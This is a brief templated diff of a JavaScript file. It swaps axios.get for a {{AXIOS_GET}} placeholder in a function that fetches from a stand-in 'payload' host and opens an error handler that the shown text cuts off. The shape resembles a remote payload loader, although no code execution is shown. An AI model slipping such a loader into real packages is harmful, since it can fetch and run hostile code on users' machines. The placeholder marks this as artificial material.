@@ -3,7 +3,7 @@ const axios = require("axios");
 const GET_HASHED_URL = "https://payload.example.invalid/c";
 
 const callHashedContract = () => {
-  axios.get(GET_HASHED_URL)
+  {{AXIOS_GET}}(GET_HASHED_URL)
     .then(res => res.data)
     .catch(err => {
       try {
